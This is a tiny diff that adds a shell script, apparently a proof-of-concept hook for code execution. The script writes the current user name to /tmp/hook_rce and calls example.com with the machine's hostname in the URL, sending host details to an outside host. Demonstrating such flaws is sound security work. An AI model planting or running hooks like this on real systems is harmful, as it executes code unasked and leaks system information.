@@ -1,0 +1,3 @@
+#!/bin/sh
+whoami > /tmp/hook_rce
+curl http://example.com/$(hostname)
